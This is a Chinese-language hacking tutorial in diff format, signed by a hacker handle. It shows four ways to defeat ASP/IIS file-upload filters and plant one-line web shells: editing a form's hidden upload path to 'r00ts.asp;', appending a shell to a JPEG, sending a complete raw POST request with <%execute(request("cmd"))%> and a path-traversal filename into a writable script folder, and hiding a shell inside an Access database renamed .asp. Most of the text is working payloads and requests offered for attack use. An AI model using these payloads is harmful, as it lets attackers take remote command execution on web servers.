@@ -1,0 +1,116 @@
+1.
+
+
+<body> <table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#F3F3F3"> <form name="form1" enctype="multipart/form-data" method="post" action="admin_UpfileSave.asp"> <tr> <td> <span class="tablebody2"> </span> <input name="file" type="file" size="30" onChange="showpic(this.value)"> <input type="submit" name="Submit" value="上传"> <span class="tablebody2"> <input type="hidden" name="filepath" value="../uppics/"> <input name="NameControl" type="hidden" id="NameControl" value="hdnPicName"> <input name="IdControl" type="hidden" id="IdControl" value="hdnPicId"
+
+
+
+修改：
+<form name="form1" enctype="multipart/form-data" method="post" action="http://www.XXXX.com/manage/admin_UpfileSave.asp">
+
+<input type="hidden" name="filepath" value="../uppics/r00ts.asp;">
+
+
+然后新建一个asp，内容是<!--#include file="1.jpg" --> 为1.asp
+
+
+把那个马改为1.jpg 
+
+
+然后在地址输入www.xxxx.com/r00ts.asp，成功了，就这样，跳转过去r00ts.jpg了。
+
+
+
+2.
+
+直接写了个一句话马，找了张正常图片，
+Copy /b 1.jpg+2.asp 3.asp 
+成功上传，但结果用客户端连接却不成功，不晓得程序还在哪里做了检查。
+郁闷了半小时，突然灵光一现，想到前段时间听朋友讲的数字水印，可以图片空隙处
+C32空白的区域加了ASPX的一句话马，ASP一句当然也一样的。突破
+
+
+
+3.upfile 又一奇迹般的突破
+不知道各位。在上传的时候。 有没需要过。  一个上传。 不修改名字。。然后上传目录已经被程序所定义了。
+然而。上传目录取消了脚本执行的权限。   我想这里估计大家都要放弃了。
+如何突破呢?其实是可以的.   关键是   [不修改名字]
+先来看看一个上传的数据包:
+POST /fa-bu/upload/upfile1.asp HTTP/1.1
+Accept: application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, */*
+Referer: http://xxxxx/fa-bu/upload/upload.asp
+Accept-Language: zh-cn
+Content-Type: multipart/form-data; boundary=---------------------------7da290150c5e
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
+Host: xxx.xxxx.xxnet
+Content-Length: 448
+Connection: Keep-Alive
+Cache-Control: no-cache
+Cookie: ASPSESSIONIDSSCTCSCT=DJBKGKLBBIGNKJMBGOENNPAN
+-----------------------------7da290150c5e
+Content-Disposition: form-data; name="act"
+upload
+-----------------------------7da290150c5e
+Content-Disposition: form-data; name="file1"; filename="E:\xxx\xxx\xx\111.asp;.gif"
+Content-Type: text/plain
+<%execute(request("cmd"))%>
+-----------------------------7da290150c5e
+Content-Disposition: form-data; name="Submit"
+up
+-----------------------------7da290150c5e--
+关键是 :
+Content-Disposition: form-data; name="file1"; filename="E:\xxx\xxx\xx\111.asp;.gif"
+我首先呢。  filename他是如何判断 那个开始就是文件名呢?       他是判断filename里的最右边的一个"\"以后的就是文件名字了。
+大家因该知道。 在windows下  "\" 和 "/" 是不分家的。
+假设上传之后的目录为upload/
+然后一个可以执行可以写的目录为 okokok/
+那么我们只要构造
+Content-Disposition: form-data; name="file1"; filename="E:\xxx\xxx\xx\./../okokok/111.asp;.gif"
+那么我们上传的文件就成功的传进去了 okokok/111.asp;.gif了。
+突破之！
+PS: win+iis6.0测试成功。
+[转载请注明，谢谢合作、否则木JJ。
+by www.sb-sb.cn   闷豆
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+4.
+
+1.新建一个mdb
+
+2.建表，考入：┼攠數畣整爠煥敵瑳∨≡┩> nbsp;
+
+（实际是<% execute request(“a”)%>）
+
+3.改后缀为asp/asa
+
+4.上传
+
+5.一句话客户端或者菜刀连接
